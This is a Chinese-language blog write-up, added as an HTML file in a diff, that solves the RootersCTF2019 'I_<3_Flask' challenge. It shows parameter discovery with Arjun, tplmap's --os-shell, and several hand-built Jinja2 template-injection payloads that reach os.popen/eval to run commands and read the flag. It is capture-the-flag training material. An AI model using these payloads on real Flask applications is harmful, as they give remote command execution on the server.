@@ -1,0 +1,136 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/">2022-02-11</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h1 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h1><p>这道题是模板注入。</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p>
+<p>首先查看源代码，并没有什么用。</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p>
+<p>dirsearch爆破一下，什么也没有。</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p>
+<p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p>
+<p>我们这里采用arjun工具进行爆破。工具链接：<a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p>
+<p>测试了一下的确存在模板注入。</p>
+<p>接下来就是对漏洞的利用。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p>
+<p>成功，发现为Jinja2模板，在ctf题目中经常考察</p>
+<p>直接–os-shell拿下shell，读取flag</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p>
+<h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p>
+<p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p>
+<p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p>
+<p>首先给几个比较通用的payload</p>
+<pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p>
+<pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
+&#123;% if c.__name__ == 'catch_warnings' %&#125;
+  &#123;% for b in c.__init__.__globals__.values() %&#125;
+  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
+    &#123;% if 'eval' in b.keys() %&#125;
+      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;
+    &#123;% endif %&#125;
+  &#123;% endif %&#125;
+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;
+</code></pre>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" alt="image-20220211111724780"></p>
+<p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p>
+<p>1、有popen()的类</p>
+<pre><code>os._wrap_close
+payload:
+&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;
+</code></pre>
+<p>2、有os模块的</p>
+<p>socket._socketobject（一般在71）、site._Printer等模块</p>
+<pre><code>payload:
+&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;
+</code></pre>
+<p>3、有builtins的类</p>
+<p>__ builtins __代码执行（最常用的方法）</p>
+<p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p>
+<p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p>
+<p>好了，接下来进行实践。</p>
+<p>我们把所有子类列出来</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p>
+<p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p>
+<pre><code class="python">import json
+
+a = &quot;&quot;&quot;
+&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;
+&quot;&quot;&quot;
+
+num = 0
+allList = []
+
+result = &quot;&quot;
+for i in a:
+    if i == &quot;&gt;&quot;:
+        result += i
+        allList.append(result)
+        result = &quot;&quot;
+    elif i == &quot;\n&quot; or i == &quot;,&quot;:
+        continue
+    else:
+        result += i
+        
+for k,v in enumerate(allList):
+    if &quot;os._wrap_close&quot; in v:
+        print(str(k)+&quot;---&gt;&quot;+v)
+</code></pre>
+<p>我们先来找下os._wrap_close</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p>
+<p>已经出来了在132位，那么我们就可以构造一个payload</p>
+<pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;
+</code></pre>
+<p>我们来测试一下是否可以</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p>
+<p>成功列出来了文件。</p>
+<p>直接读取flag</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" alt="image-20220211112747491"></p>
+<p>同理，可以利用的类还有很多啊，</p>
+<p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p>
+<p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p>
+<p>方法有很多，理解原理并掌握其中几种方法即可。</p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/">https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">发现漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7tplmap"><span class="toc-number">2.1.</span> <span class="toc-text">工具tplmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">手工利用</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/">SUCTF 2019 EasyWeb_0x61-0x6F &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
